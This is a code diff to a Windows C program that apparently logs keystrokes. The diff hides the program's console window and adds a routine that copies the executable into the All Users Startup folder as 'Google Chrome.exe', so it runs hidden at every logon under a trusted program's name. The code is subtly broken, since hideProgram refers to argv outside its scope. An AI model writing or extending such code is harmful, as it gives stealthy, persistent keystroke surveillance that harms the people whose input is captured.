@@ -1,23 +1,17 @@
 #include <stdlib.h>
 #include <stdio.h>
-
-#ifdef _WIN32
-
 #include <windows.h>
-
-#else
-
-#include <gtk/gtk.h>
-
-#endif
+#include <sys/stat.h>
 
 void getWords();
+int fileExists(char *file);
+void hideProgram();
 
-int main(int argc, char *Arquivo[])
+int main(int argc, char* argv[])
 {	
-	system("echo off");
 	ShowWindow(GetForegroundWindow(), SW_HIDE);
-
+	hideProgram();
+	system("pause");
 	return 0;
 }
 
@@ -40,4 +34,25 @@ void getWords()
 			printf("%c", tecla);
 		}
 	}
+}
+
+void hideProgram(){
+	char* AllUsersProfile = getenv("allusersprofile");
+	char destino[9999];
+	strcpy(destino, AllUsersProfile);
+	strcat(destino,"\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\Google Chrome.exe");
+	if(!fileExists(destino)){
+		CopyFile(argv[0],destino,0);
+	}
+}
+
+int fileExists(char *file)
+{
+    FILE *fp;
+	fp = fopen(file,"r");
+	if(fp){
+		fclose(fp);
+		return 1;
+	}
+	return 0;
 }
